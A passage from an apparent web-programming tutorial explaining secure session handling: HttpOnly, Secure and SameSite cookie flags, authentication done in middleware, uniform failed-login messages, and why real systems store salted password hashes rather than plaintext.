    string authenticates nobody. A signed cookie carrying the email *inside* it
    would still be valid after logout unless you kept a revocation list.

    **`HttpOnly; Secure; SameSite=Lax` on every session cookie.** `HttpOnly`
    keeps it out of `document.cookie`, which is what defeats the XSS payload
    from Exercise 42.6; `Secure` keeps it off plain HTTP; `SameSite` stops
    other sites' forms from riding along.

    **Authentication is middleware, not handler code.** `session_middleware`
    runs before every handler, attaches `request.user`, and short-circuits with
    a `401` for protected paths — so `account` can simply assume it has a user,
    and protecting a new page is one entry in `PROTECTED` rather than a
    forgotten `if` at the top of a handler.

    **The failed login says nothing useful.** `"bad credentials"` for both a
    wrong password and an unknown address; a message like "no such user" tells
    an attacker which email addresses are registered. And `USERS` here stores a
    plaintext password only because this is a teaching model — a real system
    stores a slow salted hash (bcrypt, scrypt, or Argon2) and never the
    password itself.
